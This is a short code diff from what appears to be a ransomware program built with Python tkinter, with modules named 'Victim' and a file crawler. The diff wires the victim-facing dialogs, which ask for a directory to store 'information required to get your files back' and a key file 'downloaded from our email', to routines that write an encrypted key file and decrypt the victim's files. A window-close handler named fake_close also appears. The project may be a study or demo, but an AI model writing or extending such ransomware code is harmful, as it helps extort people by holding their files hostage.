@@ -3,6 +3,7 @@ from tkinter import filedialog
 from datetime import datetime as dt
 import math
 import Victim.crawler.crawler as crawler
+import Victim.utilities as util
 import pyaudio as pa
 import wave
 import threading
@@ -60,8 +61,9 @@ def select_directory(continue_button):
     dir_name = filedialog.askdirectory(title='Select a directory to store information required to get your files back.')
     while dir_name == "":
         dir_name = filedialog.askdirectory(title='Select a directory to store information required to get your files back.')
-    print(dir_name)
-    # TODO write the key files that are needed
+
+    util.generate_encrypted_key_file(file_list, dir_name)
+
     continue_button.pack()
 
 def select_decryption_key():
@@ -69,8 +71,9 @@ def select_decryption_key():
     file_name = filedialog.askopenfilename(title='Select the file you downloaded from our email.')
     while file_name == "":
         file_name = filedialog.askopenfilename(title='Select the file you downloaded from our email.')
-    print(file_name)
-    # TODO decrypt their files
+
+    util.decrypt(file_name, file_list)
+
     window = tk.Toplevel(root)
     window.protocol('WM_DELETE_WINDOW', fake_close)
     info_label = tk.Label(window, text="""Your files are now decrypted and you can close these popups""")
